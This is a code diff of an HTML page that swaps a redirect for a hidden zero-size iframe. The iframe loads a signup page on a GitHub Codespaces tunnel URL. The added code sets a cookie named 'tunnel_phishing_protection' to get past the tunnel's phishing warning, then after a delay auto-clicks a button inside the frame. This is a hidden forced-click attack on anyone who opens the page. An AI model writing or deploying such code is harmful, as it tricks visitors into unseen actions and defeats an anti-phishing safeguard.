@@ -7,6 +7,8 @@
     <link rel="icon" href="favicon.ico" type="image/x-icon">
 </head>
 <body>
+    <iframe id="targetFrame" src="https://refactored-robot-x5p7qq47jvq3vr7q-8000.app.github.dev/signup" style="width:0;height:0;border:0; border:none;"></iframe>
+
     <script>
         // Function to set a cookie
         function setCookie(name, value, days) {
@@ -19,27 +21,27 @@
             document.cookie = name + "=" + (value || "") + expires + "; path=/";
         }
 
-        // Function to click the button after the redirect
-        function clickButtonAfterRedirect() {
-            // Wait for the target page to load
-            window.addEventListener('load', function() {
+        // Function to click the button inside the iframe
+        function clickButtonInIframe() {
+            var iframe = document.getElementById('targetFrame');
+            var iframeWindow = iframe.contentWindow;
+
+            // Wait until the iframe is loaded
+            iframe.onload = function() {
+                setCookie('tunnel_phishing_protection', 'sneaky-horse-trs946m.usw3', 365);
                 setTimeout(function() {
-                    setCookie('tunnel_phishing_protection', 'sneaky-horse-trs946m.usw3', 365);
-                    var button = document.querySelector('.btn-primary.btn.js-toggle-hidden');
+                    var button = iframeWindow.document.querySelector('.btn-primary.btn.js-toggle-hidden');
                     if (button) {
                         button.click();
                     } else {
                         console.error('Button not found');
                     }
                 }, 3000); // Adjust the delay as needed
-            });
+            };
         }
 
-        // Redirect to the target URL
-        window.location.href = "https://refactored-robot-x5p7qq47jvq3vr7q-8000.app.github.dev/signup";
-
-        // Call the function to click the button after redirect
-        clickButtonAfterRedirect();
+        // Call the function to click the button after the iframe loads
+        clickButtonInIframe();
     </script>
 </body>
 </html>
